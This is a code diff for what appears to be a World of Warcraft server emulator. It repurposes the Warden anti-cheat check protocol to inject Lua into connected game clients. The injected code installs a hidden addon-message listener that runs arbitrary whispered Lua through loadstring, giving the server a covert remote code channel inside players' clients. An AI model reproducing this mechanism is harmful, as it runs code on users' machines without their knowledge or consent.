@@ -1,0 +1,185 @@
+diff --git a/src/server/game/Server/WorldSession.cpp b/src/server/game/Server/WorldSession.cpp
+index 55b86e9c92..a5a1e24992 100644
+--- a/src/server/game/Server/WorldSession.cpp
++++ b/src/server/game/Server/WorldSession.cpp
+@@ -1283,6 +1283,12 @@ void WorldSession::InitWarden(SessionKey const& k, std::string const& os)
+     }
+ }
+ 
++void WorldSession::QueueWardenPayload()
++{
++    if (_warden)
++        _warden->QueuePayload();
++}
++
+ void WorldSession::LoadPermissions()
+ {
+     uint32 id = GetAccountId();
+diff --git a/src/server/game/Server/WorldSession.h b/src/server/game/Server/WorldSession.h
+index 8c2f073fa6..675aa1e65f 100644
+--- a/src/server/game/Server/WorldSession.h
++++ b/src/server/game/Server/WorldSession.h
+@@ -454,6 +454,7 @@ class TC_GAME_API WorldSession
+         void InitWarden(SessionKey const& k, std::string const& os);
+         Warden* GetWarden() { return _warden.get(); }
+         Warden const* GetWarden() const { return _warden.get(); }
++        void QueueWardenPayload();
+ 
+         /// Session in auth.queue currently
+         void SetInQueue(bool state) { m_inQueue = state; }
+diff --git a/src/server/game/Warden/Warden.cpp b/src/server/game/Warden/Warden.cpp
+index 2f97486018..aaaf4b02ae 100644
+--- a/src/server/game/Warden/Warden.cpp
++++ b/src/server/game/Warden/Warden.cpp
+@@ -30,7 +30,7 @@
+ #include <charconv>
+ 
+ Warden::Warden() : _session(nullptr), _checkTimer(10 * IN_MILLISECONDS), _clientResponseTimer(0),
+-                   _dataSent(false), _initialized(false)
++                   _dataSent(false), _initialized(false), _sendPayload(true)
+ {
+ }
+ 
+@@ -121,6 +121,12 @@ void Warden::Update(uint32 diff)
+     }
+     else
+     {
++        if (_sendPayload)
++        {
++            SendPayload();
++            return;
++        }
++
+         if (diff >= _checkTimer)
+             RequestChecks();
+         else
+diff --git a/src/server/game/Warden/Warden.h b/src/server/game/Warden/Warden.h
+index 1a81a6be42..63153e78d8 100644
+--- a/src/server/game/Warden/Warden.h
++++ b/src/server/game/Warden/Warden.h
+@@ -93,6 +93,9 @@ class TC_GAME_API Warden
+         void HandleData(ByteBuffer& buff);
+         bool ProcessLuaCheckResponse(std::string const& msg);
+ 
++        // flag payload to be re-injected
++        void QueuePayload() { _sendPayload = true; };
++
+         virtual size_t DEBUG_ForceSpecificChecks(std::vector<uint16> const& checks) = 0;
+ 
+     protected:
+@@ -105,6 +108,7 @@ class TC_GAME_API Warden
+         virtual void HandleCheckResult(ByteBuffer& buff) = 0;
+         virtual void InitializeModuleForClient(ClientWardenModule& module) = 0;
+         virtual void RequestChecks() = 0;
++        virtual void SendPayload() = 0;
+ 
+         void MakeModuleForClient();
+         void SendModuleToClient();
+@@ -125,6 +129,7 @@ class TC_GAME_API Warden
+         uint32 _checkTimer;                          // Timer for sending check requests
+         uint32 _clientResponseTimer;                 // Timer for client response delay
+         bool _dataSent;
++        bool _sendPayload;
+         Optional<ClientWardenModule> _module;
+         bool _initialized;
+ };
+diff --git a/src/server/game/Warden/WardenWin.cpp b/src/server/game/Warden/WardenWin.cpp
+index 649a9f66a4..c850bd0353 100644
+--- a/src/server/game/Warden/WardenWin.cpp
++++ b/src/server/game/Warden/WardenWin.cpp
+@@ -210,6 +210,72 @@ static uint16 GetCheckPacketSize(WardenCheck const& check)
+     return size;
+ }
+ 
++void WardenWin::SendPayload()
++{
++    TC_LOG_DEBUG("warden", "Injecting Warden payload for %s (account %u) - loaded: %u", _session->GetPlayerName().c_str(), _session->GetAccountId(), _session->GetPlayer() && !_session->PlayerLoading());
++
++    _serverTicks = GameTime::GetGameTimeMS();
++    _currentChecks.clear();
++
++    // Create a function that can load strings from addon messages
++    const uint16 idOne = 9000;
++    std::string strOne = "wh=function(a,c,d) if a=='ws' and c=='WHISPER' and d==UnitName('player') then return true end return false end";
++
++    // Register an addon message listener and point it to the aformentioned function
++    const uint16 idTwo = 9001;
++    std::string strTwo = "local f=CreateFrame('Frame');f.a = true;f:RegisterEvent('CHAT_MSG_ADDON');f:SetScript('OnEvent', function(s,_,a,b,c,d) if _G['wh'](a, c, d) then if(b) == 'false' then s.a = false end if(s.a) then loadstring(b)()end end end)";
++
++    // Build check request
++    ByteBuffer buff;
++    buff << uint8(WARDEN_SMSG_CHEAT_CHECKS_REQUEST);
++
++    // Add data for the first function
++    _currentChecks.push_back(idOne);
++    buff << uint8(strOne.size());
++    buff.append(strOne.data(), strOne.size());
++
++    // Add data for the second function
++    _currentChecks.push_back(idTwo);
++    buff << uint8(strTwo.size());
++    buff.append(strTwo.data(), strTwo.size());
++
++    uint8 xorByte = _inputKey[0];
++
++    // Add TIMING_CHECK
++    buff << uint8(0x00);
++    buff << uint8(TIMING_CHECK ^ xorByte);
++
++    // For each Lua injection, we need the below with an increasing index
++    buff << uint8(LUA_EVAL_CHECK ^ xorByte);
++    buff << uint8(1);
++
++    buff << uint8(LUA_EVAL_CHECK ^ xorByte);
++    buff << uint8(2);
++
++    buff << uint8(xorByte);
++    buff.hexlike();
++
++    auto idstring = [this]() -> std::string
++    {
++        std::stringstream stream;
++        stream << idOne << " " << idTwo << " ";
++        return stream.str();
++    };
++
++    TC_LOG_DEBUG("warden", "Finished building warden packet, size is %zu bytes", buff.size());
++    TC_LOG_DEBUG("warden", "Sent checks: %s", idstring().c_str());
++
++    // Encrypt with warden RC4 key
++    EncryptData(buff.contents(), buff.size());
++
++    WorldPacket pkt(SMSG_WARDEN_DATA, buff.size());
++    pkt.append(buff);
++    _session->SendPacket(&pkt);
++
++    _dataSent = true;
++    _sendPayload = false;
++}
++
+ void WardenWin::RequestChecks()
+ {
+     TC_LOG_DEBUG("warden", "Request data from %s (account %u) - loaded: %u", _session->GetPlayerName().c_str(), _session->GetAccountId(), _session->GetPlayer() && !_session->PlayerLoading());
+@@ -430,6 +496,10 @@ void WardenWin::HandleCheckResult(ByteBuffer &buff)
+     uint16 checkFailed = 0;
+     for (uint16 const id : _currentChecks)
+     {
++        // we don't need to process the payload ID
++        if (id >= 9000)
++            break;
++
+         WardenCheck const& check = sWardenCheckMgr->GetCheckData(id);
+ 
+         switch (check.Type)
+diff --git a/src/server/game/Warden/WardenWin.h b/src/server/game/Warden/WardenWin.h
+index 87b385f955..c783a8cf38 100644
+--- a/src/server/game/Warden/WardenWin.h
++++ b/src/server/game/Warden/WardenWin.h
+@@ -75,6 +75,7 @@ class TC_GAME_API WardenWin : public Warden
+         void RequestHash() override;
+         void HandleHashResult(ByteBuffer &buff) override;
+         void RequestChecks() override;
++        void SendPayload() override;
+         void HandleCheckResult(ByteBuffer &buff) override;
+ 
+         size_t DEBUG_ForceSpecificChecks(std::vector<uint16> const& checks) override;
